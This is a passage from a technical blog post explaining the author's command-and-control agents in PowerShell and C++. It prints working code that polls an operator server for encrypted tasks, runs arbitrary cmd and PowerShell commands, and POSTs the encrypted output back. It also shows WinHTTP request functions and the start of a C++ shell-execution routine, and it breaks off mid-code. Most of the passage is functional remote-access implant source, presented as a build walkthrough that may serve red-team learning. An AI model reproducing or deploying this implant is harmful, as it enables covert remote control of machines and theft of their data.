<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$resultl</span> = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/results/<span class="variable">$name</span>"</span>)</span><br><span class="line"><span class="variable">$taskl</span>   = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/tasks/<span class="variable">$name</span>"</span>)</span><br></pre></td></tr></table></figure>

<p>Then it starts the infinite loop:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;)&#123;</span><br><span class="line">...</span><br><span class="line">sleep <span class="variable">$n</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Let’s take a look inside the loop, first thing it does is request new tasks, we know that if there are no new tasks the server will respond with a <code>204</code> empty response, so it checks if the response is not null or empty and based on that it decides whether to execute the task execution code block or just sleep again:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$task</span>  = (<span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$taskl</span> <span class="literal">-Method</span> <span class="string">'GET'</span>).Content</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="operator">-Not</span> [<span class="built_in">string</span>]::IsNullOrEmpty(<span class="variable">$task</span>))&#123;</span><br></pre></td></tr></table></figure>

<p>Inside the task execution code block it takes the encrypted response and decrypts it, splits it then saves the first word in a variable called flag:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$task</span> = Decrypt <span class="variable">$key</span> <span class="variable">$task</span></span><br><span class="line"><span class="variable">$task</span> = <span class="variable">$task</span>.split()</span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$task</span>[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>If the flag was <code>VALID</code> it will continue, otherwise it will sleep again. This ensures that the data has been decrypted correctly.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$flag</span> <span class="operator">-eq</span> <span class="string">"VALID"</span>)&#123;</span><br></pre></td></tr></table></figure>

<p>After ensuring that the data is valid, it takes the command it’s supposed to execute and the arguments:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="variable">$task</span>[<span class="number">1</span>]</span><br><span class="line"><span class="variable">$args</span>    = <span class="variable">$task</span>[<span class="number">2</span><span class="type">..</span><span class="variable">$task</span><span class="type">.Length</span>]</span><br></pre></td></tr></table></figure>

<p>There are 5 valid commands, <code>shell</code>, <code>powershell</code>, <code>rename</code>, <code>sleep</code> and <code>quit</code>.</p>
<p><code>shell</code> executes <code>cmd</code> commands, <code>powershell</code> executes <code>powershell</code> commands, <code>rename</code> changes the agent’s name, <code>sleep</code> changes the sleep time and <code>quit</code> just exits.</p>
<p>Let’s take a look at each one of them. The <code>shell</code> and <code>powershell</code> commands basically rely on the same function called <code>shell</code>, so let’s look at that first:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span><span class="params">(<span class="variable">$fname</span>, <span class="variable">$arg</span>)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$pinfo</span>                        = <span class="built_in">New-Object</span> System.Diagnostics.ProcessStartInfo</span><br><span class="line">    <span class="variable">$pinfo</span>.FileName               = <span class="variable">$fname</span></span><br><span class="line">    <span class="variable">$pinfo</span>.RedirectStandardError  = <span class="variable">$true</span></span><br><span class="line">    <span class="variable">$pinfo</span>.RedirectStandardOutput = <span class="variable">$true</span></span><br><span class="line">    <span class="variable">$pinfo</span>.UseShellExecute        = <span class="variable">$false</span></span><br><span class="line">    <span class="variable">$pinfo</span>.Arguments              = <span class="variable">$arg</span></span><br><span class="line">    <span class="variable">$p</span>                            = <span class="built_in">New-Object</span> System.Diagnostics.Process</span><br><span class="line">    <span class="variable">$p</span>.StartInfo                  = <span class="variable">$pinfo</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$p</span>.Start() | <span class="built_in">Out-Null</span></span><br><span class="line">    <span class="variable">$p</span>.WaitForExit()</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$stdout</span> = <span class="variable">$p</span>.StandardOutput.ReadToEnd()</span><br><span class="line">    <span class="variable">$stderr</span> = <span class="variable">$p</span>.StandardError.ReadToEnd()</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span> = <span class="string">"VALID <span class="variable">$stdout</span>`n<span class="variable">$stderr</span>"</span></span><br><span class="line">    <span class="variable">$res</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It starts a new process with the given file name whether it was <code>cmd.exe</code> or <code>powershell.exe</code> and passes the given arguments, then it receives <code>stdout</code> and <code>stderr</code> and returns the result which is the <code>VALID</code> flag appended with <code>stdout</code> and <code>stderr</code> separated by a newline.</p>
<p>Now back to the <code>shell</code> and <code>powershell</code> commands, both of them call <code>shell()</code> with the corresponding file name, receive the output, encrypt it and send it:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"shell"</span>)&#123;</span><br><span class="line">    <span class="variable">$f</span>    = <span class="string">"cmd.exe"</span></span><br><span class="line">    <span class="variable">$arg</span>  = <span class="string">"/c "</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">in</span> <span class="variable">$args</span>)&#123; <span class="variable">$arg</span> += <span class="variable">$a</span> + <span class="string">" "</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span>  = shell <span class="variable">$f</span> <span class="variable">$arg</span></span><br><span class="line">    <span class="variable">$res</span>  = Encrypt <span class="variable">$key</span> <span class="variable">$res</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="selector-tag">@</span>&#123;result = <span class="string">"<span class="variable">$res</span>"</span>&#125;</span><br><span class="line">                </span><br><span class="line">    <span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$resultl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"powershell"</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$f</span>    = <span class="string">"powershell.exe"</span></span><br><span class="line">    <span class="variable">$arg</span>  = <span class="string">"/c "</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">in</span> <span class="variable">$args</span>)&#123; <span class="variable">$arg</span> += <span class="variable">$a</span> + <span class="string">" "</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span>  = shell <span class="variable">$f</span> <span class="variable">$arg</span></span><br><span class="line">    <span class="variable">$res</span>  = Encrypt <span class="variable">$key</span> <span class="variable">$res</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="selector-tag">@</span>&#123;result = <span class="string">"<span class="variable">$res</span>"</span>&#125;</span><br><span class="line">                </span><br><span class="line">    <span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$resultl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>The <code>sleep</code> command updates the <code>n</code> variable then sends an empty result indicating that it completed the task:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"sleep"</span>)&#123;</span><br><span class="line">    <span class="variable">$n</span>    = [<span class="built_in">int</span>]<span class="variable">$args</span>[<span class="number">0</span>]</span><br><span class="line">    <span class="variable">$data</span> = <span class="selector-tag">@</span>&#123;result = <span class="string">""</span>&#125;</span><br><span class="line">    <span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$resultl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>The <code>rename</code> command updates the <code>name</code> variable and updates the tasks and results <code>uri</code>s, then it sends an empty result indicating that it completed the task:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"rename"</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span>    = <span class="variable">$args</span>[<span class="number">0</span>]</span><br><span class="line">    <span class="variable">$resultl</span> = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/results/<span class="variable">$name</span>"</span>)</span><br><span class="line">    <span class="variable">$taskl</span>   = (<span class="string">"http"</span> + <span class="string">':'</span> + <span class="string">"//<span class="variable">$ip</span>"</span> + <span class="string">':'</span> + <span class="string">"<span class="variable">$port</span>/tasks/<span class="variable">$name</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$data</span>    = <span class="selector-tag">@</span>&#123;result = <span class="string">""</span>&#125;</span><br><span class="line">    <span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="variable">$resultl</span> <span class="literal">-Body</span> <span class="variable">$data</span> <span class="literal">-Method</span> <span class="string">'POST'</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>The <code>quit</code> command just exits:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$command</span> <span class="operator">-eq</span> <span class="string">"quit"</span>)&#123;</span><br><span class="line">	<span class="keyword">exit</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="C-Agent"><a href="#C-Agent" class="headerlink" title="C++ Agent"></a>C++ Agent</h3><p>The same logic is applied in the c++ agent so I will skip the unnecessary parts and only talk about the <code>http</code> functions and the <code>shell</code> function.</p>
<p>Sending <code>http</code> requests wasn’t as easy as it was in <code>powershell</code>, I used the <code>winhttp</code> library and with the help of the <a href="https://docs.microsoft.com/en-us/windows/win32/winhttp/about-winhttp" target="_blank" rel="noopener">Microsoft documentation</a> I created two functions, one for sending <code>GET</code> requests and the other for sending <code>POST</code> requests. And they’re almost the same function so I guess I will rewrite them to be one function later.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">Get</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> ip, <span class="keyword">unsigned</span> <span class="keyword">int</span> port, <span class="built_in">std</span>::<span class="built_in">string</span> uri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> sip     = get_utf16(ip, CP_UTF8);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> suri    = get_utf16(uri, CP_UTF8);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> response;</span><br><span class="line"></span><br><span class="line">    LPSTR pszOutBuffer;</span><br><span class="line"></span><br><span class="line">    DWORD dwSize       = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    BOOL  bResults     = FALSE;</span><br><span class="line"> </span><br><span class="line">    HINTERNET hSession = <span class="literal">NULL</span>,</span><br><span class="line">              hConnect = <span class="literal">NULL</span>,</span><br><span class="line">              hRequest = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hSession = WinHttpOpen(<span class="string">L"test"</span>,</span><br><span class="line">                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">                           WINHTTP_NO_PROXY_NAME,</span><br><span class="line">                           WINHTTP_NO_PROXY_BYPASS,</span><br><span class="line">                           <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hSession) &#123;</span><br><span class="line"></span><br><span class="line">        hConnect = WinHttpConnect(hSession,</span><br><span class="line">                                  sip.c_str(),</span><br><span class="line">                                  port,</span><br><span class="line">                                  <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hConnect) &#123;</span><br><span class="line"></span><br><span class="line">        hRequest = WinHttpOpenRequest(hConnect,</span><br><span class="line">                                      <span class="string">L"GET"</span>, suri.c_str(),</span><br><span class="line">                                      <span class="literal">NULL</span>,</span><br><span class="line">                                      WINHTTP_NO_REFERER,</span><br><span class="line">                                      WINHTTP_DEFAULT_ACCEPT_TYPES,</span><br><span class="line">                                      <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRequest) &#123;</span><br><span class="line"></span><br><span class="line">        bResults = WinHttpSendRequest(hRequest,</span><br><span class="line">                                      WINHTTP_NO_ADDITIONAL_HEADERS,</span><br><span class="line">                                      <span class="number">0</span>,</span><br><span class="line">                                      WINHTTP_NO_REQUEST_DATA,</span><br><span class="line">                                      <span class="number">0</span>,</span><br><span class="line">                                      <span class="number">0</span>,</span><br><span class="line">                                      <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bResults) &#123;</span><br><span class="line"></span><br><span class="line">        bResults = WinHttpReceiveResponse(hRequest, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            dwSize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))&#123;&#125;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                dwSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ZeroMemory(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123;&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    </span><br><span class="line">                    response = response + <span class="built_in">std</span>::<span class="built_in">string</span>(pszOutBuffer);</span><br><span class="line">                    <span class="keyword">delete</span>[] pszOutBuffer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    <span class="keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">Post</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> ip, <span class="keyword">unsigned</span> <span class="keyword">int</span> port, <span class="built_in">std</span>::<span class="built_in">string</span> uri, <span class="built_in">std</span>::<span class="built_in">string</span> dat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPSTR data     = <span class="keyword">const_cast</span>&lt;<span class="keyword">char</span>*&gt;(dat.c_str());;</span><br><span class="line">    DWORD data_len = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line">    LPCWSTR additionalHeaders = <span class="string">L"Content-Type: application/x-www-form-urlencoded\r\n"</span>;</span><br><span class="line">    DWORD headersLength       = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> sip     = get_utf16(ip, CP_UTF8);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> suri    = get_utf16(uri, CP_UTF8);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> response;</span><br><span class="line"></span><br><span class="line">    LPSTR pszOutBuffer;</span><br><span class="line"></span><br><span class="line">    DWORD dwSize       = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    BOOL  bResults     = FALSE;</span><br><span class="line"> </span><br><span class="line">    HINTERNET hSession = <span class="literal">NULL</span>,</span><br><span class="line">              hConnect = <span class="literal">NULL</span>,</span><br><span class="line">              hRequest = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hSession = WinHttpOpen(<span class="string">L"test"</span>,</span><br><span class="line">                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">                           WINHTTP_NO_PROXY_NAME,</span><br><span class="line">                           WINHTTP_NO_PROXY_BYPASS,</span><br><span class="line">                           <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hSession) &#123;</span><br><span class="line"></span><br><span class="line">        hConnect = WinHttpConnect(hSession,</span><br><span class="line">                                  sip.c_str(),</span><br><span class="line">                                  port,</span><br><span class="line">                                  <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hConnect) &#123;</span><br><span class="line"></span><br><span class="line">        hRequest = WinHttpOpenRequest(hConnect,</span><br><span class="line">                                      <span class="string">L"POST"</span>, suri.c_str(),</span><br><span class="line">                                      <span class="literal">NULL</span>,</span><br><span class="line">                                      WINHTTP_NO_REFERER,</span><br><span class="line">                                      WINHTTP_DEFAULT_ACCEPT_TYPES,</span><br><span class="line">                                      <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRequest) &#123;</span><br><span class="line"></span><br><span class="line">        bResults = WinHttpSendRequest(hRequest,</span><br><span class="line">                                      additionalHeaders,</span><br><span class="line">                                      headersLength,</span><br><span class="line">                                      (LPVOID)data,</span><br><span class="line">                                      data_len,</span><br><span class="line">                                      data_len,</span><br><span class="line">                                      <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bResults) &#123;</span><br><span class="line"></span><br><span class="line">        bResults = WinHttpReceiveResponse(hRequest, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            dwSize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))&#123;&#125;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                dwSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ZeroMemory(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123;&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    </span><br><span class="line">                    response = response + <span class="built_in">std</span>::<span class="built_in">string</span>(pszOutBuffer);</span><br><span class="line">                    <span class="keyword">delete</span>[] pszOutBuffer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    <span class="keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>shell</code> function does almost the same thing as the <code>shell</code> function in the other agent, some of the code is taken from Stack Overflow and I edited it:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">CStringA <span class="title">shell</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CStringA result;</span><br><span class="line">    HANDLE hPipeRead, hPipeWrite;</span><br><span class="line"></span><br><span class="line">    SECURITY_ATTRIBUTES saAttr = &#123;<span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES)&#125;;</span><br><span class="line">    saAttr.bInheritHandle = TRUE; </span><br><span class="line">    saAttr.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!CreatePipe(&amp;hPipeRead, 